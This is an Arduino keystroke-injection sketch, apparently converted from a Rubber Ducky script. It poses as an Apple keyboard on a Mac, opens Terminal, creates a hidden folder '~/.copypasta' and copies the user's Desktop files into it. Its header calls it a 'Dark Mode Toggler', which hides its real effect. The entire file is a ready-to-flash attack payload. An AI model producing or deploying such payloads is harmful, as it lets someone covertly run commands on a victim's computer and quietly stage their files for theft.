// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Creates Hidden Folder and Copies Desktop Contents
  // To find the folder follow the steps below.
  // Open Finder.
  // Click on "Go" in the menu bar at the top of the screen.
  // Select "Go to Folder" from the dropdown menu.
  // In the "Go to the folder" dialog box, enter '~/.copypasta' and click "Go".
  // Author: Narsty
  // Title: Dark Mode Toggler
  // Target: MacOS
  // Version: 1.0
  // Category: Executions
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir ~/.copypasta");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cp -R ~/Desktop/* ~/.copypasta/");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}